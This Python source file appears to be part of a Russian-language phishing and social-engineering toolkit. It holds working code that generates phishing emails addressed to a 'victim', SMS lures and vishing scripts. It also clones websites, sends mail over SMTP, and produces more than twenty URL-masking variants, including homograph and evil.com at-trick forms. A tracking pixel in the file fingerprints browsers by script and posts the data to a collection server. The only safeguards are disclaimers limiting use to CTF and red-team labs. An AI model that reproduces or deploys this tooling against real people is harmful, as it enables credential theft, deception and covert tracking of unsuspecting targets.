def _qr_build(data: str, size: int = 10, border: int = 2,
              fg: str = "black", bg: str = "white"):
    import qrcode
    from qrcode.constants import ERROR_CORRECT_M
    qr = qrcode.QRCode(
        version=None, error_correction=ERROR_CORRECT_M,
        box_size=size, border=border,
    )
    qr.add_data(data)
    qr.make(fit=True)
    return qr.make_image(fill_color=fg, back_color=bg)


def generate_qr(data: str, out_path: str | None = None,
                size: int = 10, border: int = 2,
                fg: str = "black", bg: str = "white",
                fmt: str = "png") -> Path | None:
    if not _qrcode_available():
        console.print("[red]qrcode не установлен.[/red]")
        console.print("[yellow]Установи: pip install qrcode[pil][/yellow]")
        return None

    try:
        if fmt == "svg":
            import qrcode.image.svg
            factory = qrcode.image.svg.SvgPathImage
            qr = qrcode.QRCode(
                version=None, box_size=size, border=border,
                image_factory=factory,
            )
            qr.add_data(data)
            qr.make(fit=True)
            img = qr.make_image()
            ts = datetime.now().strftime("%Y%m%d_%H%M%S")
            if not out_path:
                out_path = str(PHISH_DIR / f"qr_{ts}.svg")
            img.save(out_path)
        elif fmt == "ascii":
            import qrcode
            qr = qrcode.QRCode(border=border)
            qr.add_data(data)
            qr.make(fit=True)
            qr.print_ascii(invert=True)
            return None
        else:
            img = _qr_build(data, size, border, fg, bg)
            ts = datetime.now().strftime("%Y%m%d_%H%M%S")
            if not out_path:
                out_path = str(PHISH_DIR / f"qr_{ts}.png")
            img.save(out_path)
        console.print(f"[green]✓ QR: {out_path}[/green]")
        db.save_scan("qr_code", data[:80],
                     {"path": out_path, "format": fmt})
        return Path(out_path)
    except Exception as exc:
        console.print(f"[red]Ошибка QR: {exc}[/red]")
        return None


def qr_menu() -> None:
    console.print("[cyan]Что закодировать?[/cyan]")
    opts = [
        ("1", "URL"),
        ("2", "Текст"),
        ("3", "Wi-Fi"),
        ("4", "vCard"),
        ("5", "Email (mailto)"),
        ("6", "Телефон (tel)"),
        ("7", "SMS"),
        ("8", "Геолокация"),
        ("9", "Событие (calendar)"),
        ("10", "Bitcoin адрес"),
        ("11", "WhatsApp"),
        ("12", "Telegram"),
    ]
    for n, t in opts:
        console.print(f"  {n}. {t}")
    c = Prompt.ask("Выбор",
                    choices=[o[0] for o in opts], default="1")

    payload = ""
    if c == "1":
        payload = Prompt.ask("URL")
    elif c == "2":
        payload = Prompt.ask("Текст")
    elif c == "3":
        ssid = Prompt.ask("SSID")
        pwd = Prompt.ask("Пароль", password=True)
        enc = Prompt.ask("Шифрование",
                          choices=["WPA", "WEP", "nopass"], default="WPA")
        payload = f"WIFI:T:{enc};S:{ssid};P:{pwd};;"
    elif c == "4":
        name = Prompt.ask("Имя")
        phone = Prompt.ask("Телефон", default="")
        email = Prompt.ask("Email", default="")
        org = Prompt.ask("Организация", default="")
        payload = (
            "BEGIN:VCARD\nVERSION:3.0\nFN:" + name + "\n"
            + (f"TEL:{phone}\n" if phone else "")
            + (f"EMAIL:{email}\n" if email else "")
            + (f"ORG:{org}\n" if org else "")
            + "END:VCARD"
        )
    elif c == "5":
        to = Prompt.ask("Email")
        subj = Prompt.ask("Subject", default="")
        body = Prompt.ask("Body", default="")
        payload = (f"mailto:{to}?subject={quote(subj)}"
                   f"&body={quote(body)}")
    elif c == "6":
        payload = f"tel:{Prompt.ask('Телефон')}"
    elif c == "7":
        number = Prompt.ask("SMS получатель")
        msg = Prompt.ask("Сообщение", default="")
        payload = f"SMSTO:{number}:{msg}"
    elif c == "8":
        lat = Prompt.ask("Latitude")
        lon = Prompt.ask("Longitude")
        payload = f"geo:{lat},{lon}"
    elif c == "9":
        title = Prompt.ask("Название")
        location = Prompt.ask("Место", default="")
        start = Prompt.ask("Start (YYYYMMDDTHHMMSS)",
                            default="20260101T100000")
        end = Prompt.ask("End (YYYYMMDDTHHMMSS)",
                          default="20260101T110000")
        payload = (
            f"BEGIN:VCALENDAR\nVERSION:2.0\nBEGIN:VEVENT\n"
            f"SUMMARY:{title}\nLOCATION:{location}\n"
            f"DTSTART:{start}\nDTEND:{end}\nEND:VEVENT\nEND:VCALENDAR"
        )
    elif c == "10":
        addr = Prompt.ask("Bitcoin адрес")
        amount = Prompt.ask("Сумма BTC (опц.)", default="")
        payload = f"bitcoin:{addr}" + (f"?amount={amount}" if amount else "")
    elif c == "11":
        phone = Prompt.ask("Телефон (в формате +1234567890)")
        msg = Prompt.ask("Сообщение (опц.)", default="")
        payload = f"https://wa.me/{phone}" + (
            f"?text={quote(msg)}" if msg else "")
    elif c == "12":
        username = Prompt.ask("Telegram username (без @)")
        payload = f"https://t.me/{username}"

    if not payload:
        console.print("[red]Пустой payload.[/red]")
        return

    fmt = Prompt.ask("Формат",
                     choices=["png", "svg", "ascii"], default="png")
    generate_qr(payload, fmt=fmt)


# ===========================================================================
# Email / SMS / Voice generators
# ===========================================================================

def generate_email(template: str, out_path: str | None = None,
                   link: str = "https://example.com/login",
                   name: str = "John",
                   sender: str = "IT Support",
                   email: str = "it@example.com",
                   doc_name: str = "Q4-report.pdf",
                   tracking: str = "1Z999AA10123456784",
                   invoice_id: str = "2024-1042",
                   amount: str = "1,850.00",
                   name_ceo: str = "Robert") -> Path | None:
    if template not in EMAIL_TEMPLATES:
        console.print(f"[red]Шаблон '{template}' не найден.[/red]")
        console.print(f"[dim]Доступно: {', '.join(EMAIL_TEMPLATES.keys())}"
                      f"[/dim]")
        return None
    tpl = EMAIL_TEMPLATES[template]
    subject = tpl["subject"].format(sender=sender, name=name,
                                      invoice_id=invoice_id)
    body = tpl["body"].format(
        name=name, link=link, sender=sender, email=email,
        doc_name=doc_name, tracking=tracking,
        invoice_id=invoice_id, amount=amount,
        timestamp=datetime.now().strftime("%Y-%m-%d %H:%M"),
        name_ceo=name_ceo,
    )
    text = (
        f"To: victim@example.com\n"
        f"Subject: {subject}\n"
        f"X-Priority: 3\n"
        f"MIME-Version: 1.0\n"
        f"Content-Type: text/plain; charset=UTF-8\n\n"
        f"{body}"
    )
    if not out_path:
        ts = datetime.now().strftime("%Y%m%d_%H%M%S")
        out_path = str(PHISH_DIR / f"email_{template}_{ts}.eml")
    try:
        Path(out_path).write_text(text, encoding="utf-8")
        console.print(f"[green]✓ Email: {out_path}[/green]")
        console.print(f"[cyan]  Subject:[/cyan] {subject}")
        db.save_scan("se_email", template, {"path": out_path})
        return Path(out_path)
    except Exception as exc:
        console.print(f"[red]Ошибка: {exc}[/red]")
        return None


def send_email_via_smtp(to_addr: str, subject: str, body: str,
                        from_addr: str | None = None) -> bool:
    """Отправить email через SMTP из .env (SMTP_*)."""
    import smtplib
    from email.mime.text import MIMEText
    from email.header import Header
    need = [config.SMTP_HOST, config.SMTP_USER,
            config.SMTP_PASS, config.SMTP_TO]
    if not all(need):
        console.print("[yellow]SMTP не настроен в .env[/yellow]")
        return False
    from_addr = from_addr or config.SMTP_FROM or config.SMTP_USER
    try:
        msg = MIMEText(body, "plain", "utf-8")
        msg["Subject"] = Header(subject, "utf-8")
        msg["From"] = from_addr
        msg["To"] = to_addr
        if config.SMTP_PORT == 465:
            srv = smtplib.SMTP_SSL(config.SMTP_HOST, config.SMTP_PORT,
                                     timeout=15)
        else:
            srv = smtplib.SMTP(config.SMTP_HOST, config.SMTP_PORT,
                                timeout=15)
            srv.starttls()
        srv.login(config.SMTP_USER, config.SMTP_PASS)
        srv.sendmail(from_addr, [to_addr], msg.as_string())
        srv.quit()
        console.print(f"[green]✓ Email отправлен на {to_addr}[/green]")
        return True
    except Exception as exc:
        console.print(f"[red]SMTP: {exc}[/red]")
        return False


def generate_sms(template: str, link: str = "https://example.com",
                 name: str = "CEO", amount: str = "1000000") -> str:
    if template not in SMS_TEMPLATES:
        console.print(f"[red]Шаблон '{template}' не найден.[/red]")
        console.print(f"[dim]Доступно: {', '.join(SMS_TEMPLATES.keys())}"
                      f"[/dim]")
        return ""
    txt = SMS_TEMPLATES[template].format(link=link, name=name,
                                          amount=amount)
    console.print(f"[cyan]{len(txt)} симв.[/cyan]")
    console.print(f"[green]{txt}[/green]")
    db.save_scan("se_sms", template, {"text": txt})
    return txt


def show_voice_script(name: str) -> None:
    """Показать voice-скрипт (vishing)."""
    if name not in VOICE_SCRIPTS:
        console.print(f"[red]Неизвестный скрипт: {name}[/red]")
        console.print(f"[dim]Доступно: {', '.join(VOICE_SCRIPTS.keys())}"
                      f"[/dim]")
        return
    console.print(f"\n[bold cyan]☎ Voice script: {name}[/bold cyan]\n")
    for step, text in VOICE_SCRIPTS[name]:
        console.print(Panel(f"[green]{text}[/green]",
                             title=f"[bold]{step}[/bold]",
                             border_style="cyan"))
    db.save_scan("se_voice", name, {"steps": len(VOICE_SCRIPTS[name])})


# ===========================================================================
# Website cloning
# ===========================================================================

def clone_page(url: str, out_dir: str | None = None,
                max_resources: int = 100,
                max_size_mb: int = 5) -> Path | None:
    """Сохранить страницу + ресурсы (CSS/JS/IMG/FONTS/ICONS)."""
    try:
        r = requests.get(url, timeout=15, verify=False, headers={
            "User-Agent": config.USER_AGENT,
        })
        r.raise_for_status()
    except Exception as exc:
        console.print(f"[red]Ошибка загрузки: {exc}[/red]")
        return None

    if not out_dir:
        ts = datetime.now().strftime("%Y%m%d_%H%M%S")
        host = urlparse(url).hostname or "site"
        out_dir = str(PHISH_DIR / f"clone_{host}_{ts}")

    out = Path(out_dir)
    out.mkdir(parents=True, exist_ok=True)
    assets = out / "assets"
    assets.mkdir(exist_ok=True)

    html_text = r.text

    # Найти все ресурсы: src/href на css/js/img/font/favicon
    res_re = re.compile(
        r"""(?:src|href)\s*=\s*["']([^"']+\.(?:css|js|png|jpg|jpeg|gif|svg|webp|ico|woff2?|ttf|otf|eot))(?:\?[^"']*)?["']""",
        re.IGNORECASE,
    )
    seen: set[str] = set()
    count = 0
    total_bytes = 0
    max_bytes = max_size_mb * 1024 * 1024

    for m in res_re.finditer(html_text):
        if count >= max_resources:
            break
        u = m.group(1)
        if u in seen or u.startswith("data:"):
            continue
        seen.add(u)
        full = u if u.startswith("http") else (
            f"{urlparse(url).scheme}://{urlparse(url).netloc}"
            + (u if u.startswith("/") else "/" + u)
        )
        fname = re.sub(r"[^A-Za-z0-9._-]", "_",
                        u.split("/")[-1].split("?")[0])[:60]
        if not fname:
            continue
        try:
            rr = requests.get(full, timeout=10, verify=False,
                               headers={"User-Agent": "Mozilla/5.0"})
            if rr.status_code == 200 and \
               total_bytes + len(rr.content) < max_bytes:
                (assets / fname).write_bytes(rr.content)
                # Rewrite path
                html_text = re.sub(
                    re.escape(u) + r"(\?[^\"']*)?",
                    f"assets/{fname}",
                    html_text,
                )
                total_bytes += len(rr.content)
                count += 1
        except Exception:
            continue

    # Inject <base> + URL prefix (для корректных относительных ссылок)
    base_tag = f'<base href="{url}">'
    html_text = re.sub(r"(<head[^>]*>)", r"\1\n  " + base_tag,
                        html_text, count=1, flags=re.IGNORECASE)

    index = out / "index.html"
    try:
        index.write_text(html_text, encoding="utf-8")
    except Exception as exc:
        console.print(f"[red]Ошибка записи: {exc}[/red]")
        return None

    console.print(f"[green]✓ Клон: {index}[/green]")
    console.print(f"[dim]  Ресурсов: {count}, "
                  f"{total_bytes / 1024:.1f} KB[/dim]")
    db.save_scan("se_clone", url,
                 {"path": str(out), "assets": count,
                  "size_kb": total_bytes / 1024})
    return out


# ===========================================================================
# URL obfuscation
# ===========================================================================

def _ip_to_decimal(ip: str) -> str:
    try:
        parts = [int(p) for p in ip.split(".")]
        return str(
            (parts[0] << 24) + (parts[1] << 16) + (parts[2] << 8) + parts[3]
        )
    except Exception:
        return ip


def _ip_to_octal(ip: str) -> str:
    try:
        return ".".join(f"0{int(p):o}" for p in ip.split("."))
    except Exception:
        return ip


def _ip_to_hex(ip: str) -> str:
    try:
        return ".".join(f"0x{int(p):02x}" for p in ip.split("."))
    except Exception:
        return ip


def url_obfuscation(url: str) -> None:
    """Показать 20+ вариантов маскировки URL."""
    parsed = urlparse(url)
    host = parsed.hostname or ""
    scheme = parsed.scheme or "http"
    path = parsed.path or "/"

    table = Table(title=f"🎭 URL obfuscation ({url[:60]})")
    table.add_column("#", style="yellow", width=3)
    table.add_column("Тип", style="cyan", width=22)
    table.add_column("URL", style="green", max_width=80)

    i = 0

    def _add(kind: str, value: str) -> None:
        nonlocal i
        i += 1
        table.add_row(str(i), kind, value[:80])

    # 1. Direct
    _add("direct", url)

    # 2. Punycode (для IDN)
    try:
        puny = host.encode("idna").decode()
        if puny != host:
            _add("punycode", url.replace(host, puny))
    except Exception:
        pass

    # 3. Decimal IP
    try:
        socket.inet_aton(host)
        _add("decimal-ip", url.replace(host, _ip_to_decimal(host)))
    except Exception:
        pass

    # 4. Octal IP
    try:
        socket.inet_aton(host)
        _add("octal-ip", url.replace(host, _ip_to_octal(host)))
    except Exception:
        pass

    # 5. Hex IP
    try:
        socket.inet_aton(host)
        _add("hex-ip", url.replace(host, _ip_to_hex(host)))
    except Exception:
        pass

    # 6. IPv6-mapped
    try:
        socket.inet_aton(host)
        _add("ipv6-mapped", url.replace(host, f"[::ffff:{host}]"))
    except Exception:
        pass

    # 7. @-trick (userinfo)
    _add("at-trick", f"{scheme}://{host}@{host}{path}")

    # 8. @-trick reverse
    _add("at-trick-rev", f"{scheme}://{host}@evil.com{path}")

    # 9. Backslash
    _add("backslash", url.replace("//", "//", 1) + "/..\\")

    # 10. Trailing dot
    _add("trailing-dot", url.replace(host, host + "."))

    # 11. Double dot
    _add("double-dot", url.replace(host, host + ".."))

    # 12. Case-shuffle (path)
    if path and path != "/":
        shuffled = "".join(
            c.upper() if idx % 2 == 0 else c.lower()
            for idx, c in enumerate(path)
        )
        _add("case-shuffle-path", url.replace(path, shuffled))

    # 13. URL-encoded path
    if path and path != "/":
        _add("url-encoded-path", url.replace(path, quote(path, safe="/")))

    # 14. Double URL-encoded
    if path and path != "/":
        enc = quote(quote(path, safe="/"), safe="/")
        _add("double-url-encoded", url.replace(path, enc))

    # 15. Null byte
    if path and path != "/":
        _add("null-byte", url.replace(path, path + "%00.jpg"))

    # 16. Add fragment
    _add("with-fragment", url + "#login")

    # 17. Duplicate slash
    _add("double-slash", url.replace("://", ":///"))

    # 18. Subdomain swap
    if host.count(".") >= 1:
        prefix, _, rest = host.partition(".")
        _add("subdomain-swap", f"{scheme}://{rest}/{prefix}{path}")

    # 19. Unicode dot (homograph)
    _add("unicode-dot", url.replace(host, host.replace(".", "。")))

    # 20. Cyrillic homograph hint
    _add("homograph-hint",
         f"{scheme}://{host.replace('a', 'а').replace('e', 'е')}"
         f"{path}  # кириллические а/е")

    # 21. Port swap
    _add("port-80", f"{scheme}://{host}:80{path}")

    # 22. Credentials in URL
    _add("credentials", f"{scheme}://user:pass@{host}{path}")

    console.print(table)
    console.print("[dim]⚠ Все варианты — ТОЛЬКО для собственных CTF-задач."
                  "[/dim]")
    db.save_scan("se_url_obf", url[:60], {"variants": i})


# ===========================================================================
# Tracking pixel / beacon
# ===========================================================================

def generate_tracking_pixel(server_url: str = "http://127.0.0.1:8000/pixel",
                             out_path: str | None = None,
                             fmt: str = "html") -> Path | None:
    """Tracking pixel в формате HTML/PNG/GIF/SVG."""
    ts = datetime.now().strftime("%Y%m%d_%H%M%S")

    if fmt == "html":
        content = f"""<!-- Email-safe tracking pixel + fingerprint -->
<img src="{server_url}" width="1" height="1" alt=""
     style="position:absolute;left:-9999px;border:0;outline:none;">
<script>
(function() {{
  try {{
    fetch('{server_url}', {{
      method: 'POST',
      headers: {{'Content-Type': 'application/json'}},
      body: JSON.stringify({{
        referer: document.referrer,
        tz: Intl.DateTimeFormat().resolvedOptions().timeZone,
        lang: navigator.language,
        screen: screen.width + 'x' + screen.height,
        ua: navigator.userAgent,
        platform: navigator.platform,
        cores: navigator.hardwareConcurrency,
        memory: navigator.deviceMemory || null,
        ts: new Date().toISOString()
      }})
    }}).catch(()=>{{}});
  }} catch(e) {{}}
}})();
</script>
"""
    elif fmt == "svg":
        content = f"""<svg xmlns="http://www.w3.org/2000/svg" width="1" height="1">
<image href="{server_url}" width="1" height="1"/>
</svg>"""
    elif fmt == "gif":
        # 1x1 transparent GIF
        gif_b64 = ("R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAA"
                    "LAAAAAABAAEAAAIBRAA7")
        content = base64.b64decode(gif_b64)
    else:
        console.print(f"[red]Формат: html | svg | gif[/red]")
        return None

    if not out_path:
        ext = ".html" if fmt == "html" else ("." + fmt)
        out_path = str(PHISH_DIR / f"pixel_{ts}{ext}")
    try:
        if isinstance(content, bytes):
            Path(out_path).write_bytes(content)
        else:
            Path(out_path).write_text(content, encoding="utf-8")
        console.print(f"[green]✓ Tracking pixel ({fmt}): {out_path}[/green]")
        console.print(f"[dim]Server URL: {server_url}[/dim]")
        db.save_scan("se_pixel", server_url,
                     {"path": out_path, "format": fmt})
        return Path(out_path)
    except Exception as exc:
        console.print(f"[red]Ошибка: {exc}[/red]")
        return None


# ===========================================================================
# Menu
# ===========================================================================

def menu() -> None:
    table = Table(title="[bold]🎭 Social Engineering Toolkit Pro[/bold]")
    table.add_column("№", style="yellow")
    table.add_column("Опция")
    opts = [
        ("1", f"Список шаблонов ({len(PHISH_TEMPLATES)}+{len(EMAIL_TEMPLATES)}+{len(SMS_TEMPLATES)}+{len(VOICE_SCRIPTS)})"),
        ("2", "Сгенерировать HTML фишинг-страницы"),
        ("3", "Запустить телеметрийный сервер (ловит submit)"),
        ("4", "QR-код генератор (12 типов)"),
        ("5", "Email шаблон (.eml)"),
        ("6", "SMS шаблон"),
        ("7", "Voice-скрипт (vishing)"),
        ("8", "Клонировать веб-страницу"),
        ("9", "Обфускация URL (20+ техник)"),
        ("10", "Tracking pixel (html/svg/gif)"),
    ]
    for n, t in opts:
        table.add_row(n, t)
    console.print(table)
    console.print("[yellow]⚠ Только для CTF / red team лабораторий "
                  "с письменным разрешением.[/yellow]")
    c = Prompt.ask("Выбор", choices=[o[0] for o in opts])

    if c == "1":
        list_templates()
    elif c == "2":
        tpl = Prompt.ask("Шаблон",
                         choices=list(PHISH_TEMPLATES.keys()),
                         default="employee-portal")
        theme = Prompt.ask("Theme", choices=list(THEMES.keys()),
                            default="light")
        out = Prompt.ask("Куда сохранить (Enter = авто)",
                         default="").strip()
        generate_phish_page(tpl, out or None, theme=theme)
    elif c == "3":
        tpl = Prompt.ask("Шаблон",
                         choices=list(PHISH_TEMPLATES.keys()),
                         default="employee-portal")
        theme = Prompt.ask("Theme", choices=list(THEMES.keys()),
                            default="light")
        port = IntPrompt.ask("Порт", default=8000)
        redirect = Prompt.ask("Redirect URL после submit",
                              default="https://example.com")
        run_phish_server(port=port, template=tpl,
                         redirect_url=redirect, theme=theme)
    elif c == "4":
        qr_menu()
    elif c == "5":
        tpl = Prompt.ask("Шаблон",
                         choices=list(EMAIL_TEMPLATES.keys()),
                         default="it-helpdesk")
        link = Prompt.ask("Ссылка",
                          default="https://example.com/login")
        name = Prompt.ask("Имя получателя", default="John")
        generate_email(tpl, link=link, name=name)
    elif c == "6":
        tpl = Prompt.ask("Шаблон",
                         choices=list(SMS_TEMPLATES.keys()),
                         default="bank")
        link = Prompt.ask("Ссылка", default="https://example.com")
        generate_sms(tpl, link=link)
    elif c == "7":
        name = Prompt.ask("Скрипт",
                          choices=list(VOICE_SCRIPTS.keys()),
                          default="it-helpdesk")
        show_voice_script(name)
    elif c == "8":
        url = Prompt.ask("URL для клонирования")
        clone_page(url)
    elif c == "9":
        url = Prompt.ask("URL")
        url_obfuscation(url)
    elif c == "10":
        server = Prompt.ask("URL сервера телеметрии",
                            default="http://127.0.0.1:8000/pixel")
        fmt = Prompt.ask("Формат",
                         choices=["html", "svg", "gif"],
                         default="html")
        generate_tracking_pixel(server, fmt=fmt)


# ===========================================================================
# CLI-обёртки (сохранены)
# ===========================================================================

def cli_templates() -> None:
    list_templates()


def cli_generate(template: str, out: str | None = None) -> None:
    generate_phish_page(template, out)


def cli_server(port: int = 8000, template: str = "employee-portal",
                redirect: str = "https://example.com") -> None:
    run_phish_server(port=port, template=template, redirect_url=redirect)


def cli_qr(data: str, out: str | None = None) -> None:
    generate_qr(data, out)


def cli_email(template: str, link: str = "https://example.com/login",
              name: str = "John", out: str | None = None) -> None:
    generate_email(template, out_path=out, link=link, name=name)


def cli_sms(template: str, link: str = "https://example.com") -> None:
    generate_sms(template, link=link)


def cli_clone(url: str, out: str | None = None) -> None:
    clone_page(url, out)


def cli_obfuscate(url: str) -> None:
    url_obfuscation(url)


def cli_pixel(server: str = "http://127.0.0.1:8000/pixel",
              out: str | None = None) -> None:
    generate_tracking_pixel(server, out)


def cli_voice(name: str) -> None:
    show_voice_script(name)


def cli_export_captures(fmt: str = "json") -> None:
    console.print("[yellow]Экспорт доступен через export_captures() с "
                  "конкретным списком captures.[/yellow]")